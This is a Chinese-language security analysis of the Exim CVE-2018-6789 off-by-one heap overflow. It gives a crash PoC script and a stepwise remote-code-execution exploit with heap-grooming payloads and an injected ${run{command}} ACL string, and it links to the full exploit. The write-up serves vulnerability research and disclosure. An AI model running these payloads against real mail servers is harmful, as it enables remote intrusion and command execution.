***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 **
**声明：本文公开的方法和脚本仅供学习和研究使用，任何团队和个人不得使用本文披露的相关内容从事违法网络攻击活动，否则造成的一切后果由使用者本人承担，与本文作者无关。**  
**

 **2018年2月，流行的开源邮件服务器Exim曝出了堆溢出漏洞（CVE-2018-6789），几乎影响了4.90.1之前的所有版本。**

该漏洞的发现者—台湾安全研究员Meh在博客上提供了利用该漏洞进行远程代码执行的思路，在推特中也表明了最终绕过各种缓解措施成功达成远程代码执行：

![Exim Off-by-One
RCE漏洞\(CVE-2018-6789\)利用分析\(附EXP\)](https://image.3001.net/images/20180327/15221355481009.png!small)

目前Meh并未公开该漏洞利用代码，华为未然实验室安全研究员skysider基于Meh的思路在实验环境下成功实现了远程命令执行，相关的漏洞环境和利用代码请访问：<https://github.com/skysider/VulnPOC/tree/master/CVE-2018-6789>

## 1\. 漏洞成因

漏洞的成因是b64decode函数在对不规范的base64编码过的数据进行解码时可能会溢出堆上的一个字节，比较经典的off-by-one漏洞。

存在漏洞的b64decode函数部分代码如下：

    
    
    b64decode(const uschar *code, uschar **ptr)
    
    {
    
    int x, y;
    
    uschar *result = store_get(3*(Ustrlen(code)/4) + 1);
    
    *ptr = result;
    
    /* Each cycle of the loop handles a quantum of 4 input bytes. For the last
    
    quantum this may decode to 1, 2, or 3 output bytes. */
    
     ......
    
    }

这段代码解码base64的逻辑是把4个字节当做一组，4个字节解码成3个字节，但是当最后余3个字节（即len(code)=4n+3）时，会解码成2个字节，解码后的总长度为
3n+2 字节，而分配的堆空间的大小为3n+1 ，因此就会发生堆溢出。当然，官方给出的修补方案也很简单，多分配几个字节就可以了。

## 2\. 环境搭建

Meh博客中漏洞测试的exim版本是直接通过apt安装的，但是由于debian官方已经修复了仓库中exim的漏洞，可以通过查看软件包源码的patch信息确认：

    
    
    root@skysider:~/poc/exim4-4.86.2# apt-get source exim4
    
    ......
    
    dpkg-source: info: applying 93_CVE-2017-1000368.patch
    
    dpkg-source: info: applying fix_smtp_banner.patch
    
    dpkg-source: info: applying CVE-2016-9963.patch
    
    dpkg-source: info: applying CVE-2018-6789.patch

我们选择下载早期版本的源代码进行编译安装：

    
    
    sudo apt-get build-dep exim4
    wget https://github.com/Exim/exim/releases/download/exim-4_89/exim-4.89.tar.xz

在编译过程中要安装一些依赖库，还需要修改Makefile、新建用户、配置日志文件的权限等，可以参考[Dockerfile](https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/Environment/Dockerfile)
的安装过程。

exim可以在运行时指定配置文件，为了触发漏洞以及命令执行，需要配置CRAM-MD5
authenticator以及设置acl_smtp_mail等，配置文件如下：

    
    
    acl_smtp_mail=acl_check_mail
    
    acl_smtp_data=acl_check_data
    
    begin acl
    
    acl_check_mail:
    
      .ifdef CHECK_MAIL_HELO_ISSUED
    
      deny
    
        message = no HELO given before MAIL command
    
        condition = ${if def:sender_helo_name {no}{yes}}
    
      .endif
    
      accept
    
    acl_check_data:
    
      accept
    
    begin authenticators
    
    fixed_cram:
    
      driver = cram_md5
    
      public_name = CRAM-MD5
    
      server_secret = ${if eq{$auth1}{ph10}{secret}fail}
    
      server_set_id = $auth1

以调试模式启动exim服务：

    
    
    exim -bd -d-receive -C conf.conf

也可以直接使用docker来验证该漏洞（上面的命令为默认启动命令）：

    
    
    docker run -it --name exim -p 25:25 skysider/vulndocker:cve-2018-6789

## 3\. 漏洞测试

我们使用一个简单的poc来触发漏洞，poc代码如下：

    
    
    #!/usr/bin/python
    
    # -*- coding: utf-8 -*-    
    import smtplib
    
    from base64 import b64encode
    
    print "this poc is tested in exim 4.89 x64 bit with cram-md5 authenticators"
    
    ip_address = raw_input("input ip address: ")
    
    s = smtplib.SMTP(ip_address)
    
    #s.set_debuglevel(1)
    
    # 1. put a huge chunk into unsorted bin 
    
    s.ehlo("mmmm"+"b"*0x1500) # 0x2020
    
    # 2. send base64 data and trigger off-by-one
    
    #raw_input("overwrite one byte of next chunk")
    
    s.docmd("AUTH CRAM-MD5")
    
    payload = "d"*(0x2008-1)
    
    try:
    
    s.docmd(b64encode(payload)+b64encode('\xf1\xf1')[:-1])
    
    s.quit()
    
    except smtplib.SMTPServerDisconnected:
    
    print "[!] exim server seems to be vulnerable to CVE-2018-6789."

当执行这段代码时，会触发内存错误

![Exim Off-by-One
RCE漏洞\(CVE-2018-6789\)利用分析\(附EXP\)](https://image.3001.net/images/20180327/15221356866914.png!small)

在这个过程中，堆的主要变化如下：

![Exim Off-by-One
RCE漏洞\(CVE-2018-6789\)利用分析\(附EXP\)](https://image.3001.net/images/20180327/1522135719150.png!small)

我们可以去观察错误之前的堆，attach到子进程，下图是发送ehlo消息之后的堆：

![Exim Off-by-One
RCE漏洞\(CVE-2018-6789\)利用分析\(附EXP\)](https://image.3001.net/images/20180327/15221357529565.png!small)

发送Auth数据之后，我们可以看一下执行完b64decode函数之后的堆：

![Exim Off-by-One
RCE漏洞\(CVE-2018-6789\)利用分析\(附EXP\)](https://image.3001.net/images/20180327/15221357817517.png!small)

图中圈出来的两个字节正是我们发送的Auth数据解码出来的最后两个字节，最后一个字节0xf1修改了下一个块的大小，使得原本应该是0x4040（0x6060-0x2020）的unsorted
空闲块变成了0x40f0，通过查看该空闲块紧邻的下一个堆块可以确认当前unsorted
bin的空闲块大小是被修改了，因此当从该空闲块分配空间时，malloc函数会检查该空闲块的大小 0x40f0
(低字节的低3位是标志位）与紧邻的下一个堆块标记的前一个堆块的大小 0x4040 是否相等，若不相等，就会触发内存错误。

## 4\. Exim内存管理机制

exim在libc提供的堆管理机制的基础上实现了一套自己的管理堆块的方法，引入了store pool、store block的概念。store
pool是一个单链表结构，每一个节点都是一个store block，每个store block的数据大小至少为0x2000，storeblock的结构如下：

    
    
    /* Structure describing the beginning of each big block. */
    typedef struct storeblock {
      struct storeblock *next;
      size_t length;
    } storeblock;
    

下图展示了一个storepool的完整的数据存储方式，chainbase是头结点，指向第一个storeblock，current_block是尾节点，指向链表中的最后一个节点。store_last_get指向current_block中最后分配的空间，next_yield指向下一次要分配空间时的起始位置，yield_length则表示当前store_block中剩余的可分配字节数。当current_block中的剩余字节数（yield_length）小于请求分配的字节数时，会调用malloc分配一个新的storeblock块，然后从该storeblock中分配需要的空间。更多关于exim内存管理机制可以查看store.c。

![Exim Off-by-One
RCE漏洞\(CVE-2018-6789\)利用分析\(附EXP\)](https://image.3001.net/images/20180327/15221359152250.png!small)  

## 5\. 漏洞利用

整体的漏洞利用思路参考漏洞发现者Meh的博客，通过覆盖acl字符串为 ${run{command}}
的方式，达到远程命令执行的目的。因为不同的配置和启动参数可能会导致exim服务在启动运行过程中堆栈布局存在差异，因此本漏洞利用脚本仅在给定的环境中测试生效。

下面是漏洞利用的详细步骤：

![Exim Off-by-One
RCE漏洞\(CVE-2018-6789\)利用分析\(附EXP\)](https://image.3001.net/images/20180327/15221359552542.png!small)  

###  **5.1 发送ehlo，布局堆空间**

    
    
    ehlo(s, "a"*0x1000) # 0x2020
    
    ehlo(s, "a"*0x20)

形成一块大小为0x7040的空闲堆块

###  **5.2 发送unknown command（包含不可打印字符）**

 **从unsorted bin分配内存空间**

    
    
    docmd(s, "\xee"*0x700)

发送的unknown command 的大小要满足 yield_length < (length + nonprintcount * 3 + 1)
，从而使得发送的unknown command能够调用malloc函数分配一个新的storeblock。

![Exim Off-by-One
RCE漏洞\(CVE-2018-6789\)利用分析\(附EXP\)](https://image.3001.net/images/20180327/15221359903288.png!small)

### 5.3 发送ehlo信息回收unknown命令分配的空间

    
    
    ehlo(s, "c"*0x2c00)

在回收unknown
command占用的内存空间时，由于之前的sender_host_name占用的内存空间已经释放，会发生合并，形成大小为0x2050的空闲块

### 5.4 发送Auth数据，触发漏洞，修改ehlo信息所在堆块的大小

    
    
     payload = "d"*(0x2020+0x30-0x18-1)
    
     docmd(s, b64encode(payload)+b64encode("\xf1\xf1")[:-1])

### 5.5 发送Auth数据伪造下一个块的块头信息，绕过释放sender_host_name所在堆块时的内存检查

    
    
    payload2 = 'm'*0x70+p64(0x1f41) # modify fake size
    
    docmd(s, b64encode(payload2))

![Exim Off-by-One
RCE漏洞\(CVE-2018-6789\)利用分析\(附EXP\)](https://image.3001.net/images/20180327/15221360446022.png!small)

### 5.6 释放sender_host_name所在堆块

同时为了不释放其他storeblock，发送包含无效字符的信息

    
    
    ehlo(s, "skysider+")

### 5.7 发送Auth数据

修改overlapped所在storeblock的next指针，令其指向acl字符串所在的storeblock

    
    
    payload3 = 'a'*0x2bf0 + p64(0) + p64(0x2021) + p8(0x80)
    
    try_addr = p16(try_addr*0x10+4)  # to change
    
    docmd(s, b64encode(payload3)+b64encode(try_addr)[:-1])

由于地址随机化，acl所在的storeblock高位字节未知（在docker环境下，低12bit为0x480不变），但是原始的next指针指向的storeblock与要修改的storeblock高位字节相同，仅低位3字节不同，因此可以采用局部overwrite，只需要爆破12bit即可。

### 5.8 发送ehlo消息释放所有的storeblock

    
    
    ehlo(s, "released")

此时unsorted bin表中存在多个空闲块，如下图所示，其中框出来的空闲块就是包含acl的storeblock

![Exim Off-by-One
RCE漏洞\(CVE-2018-6789\)利用分析\(附EXP\)](https://image.3001.net/images/20180327/15221361088957.png!small)

### 5.9 覆盖acl字符串

    
    
    payload4 = 'a'*0x18 + p64(0xb1) + 't'*(0xb0-0x10) + p64(0xb0) + p64(0x1f40)
    
    payload4 += 't'*(0x1f80-len(payload4))
    
    auth(s, b64encode(payload4)+'ee')
    
    payload5 = "a"*0x78 + "${run{" + command + "}}\x00"
    
    auth(s, b64encode(payload5)+"ee")

发送第一个auth消息之后，unsorted bin表如下图所示

![Exim Off-by-One
RCE漏洞\(CVE-2018-6789\)利用分析\(附EXP\)](https://image.3001.net/images/20180327/1522136198992.png!small)

接着再分配合适的空间时，就可以获取目标storeblock所在的堆块，覆盖其中的acl字符串

![Exim Off-by-One
RCE漏洞\(CVE-2018-6789\)利用分析\(附EXP\)](https://image.3001.net/images/20180327/15221362122174.png!small)

### 5.10 触发acl检查

    
    
    s.sendline("MAIL FROM: <test@163.com>")

![Exim Off-by-One
RCE漏洞\(CVE-2018-6789\)利用分析\(附EXP\)](https://image.3001.net/images/20180327/15221362695021.png!small)

![Exim Off-by-One
RCE漏洞\(CVE-2018-6789\)利用分析\(附EXP\)](https://image.3001.net/images/20180327/15221362803015.png!small)

至此就可以远程执行命令，完整的漏洞利用脚本见[exp.py
](https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/exp.py)，效果如下：

![https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/exp.py](https://image.3001.net/images/20180327/15221363271465.png!small)

## 参考

> <https://www.exim.org/exim-html-current/doc/html/spec_html/ch-> access_control_lists.html>
>
> <https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-> CVE-2018-6789-en/>
>
> <https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/>

 ***本文作者：华为未然实验室，转载请注明来自 FreeBuf.COM**

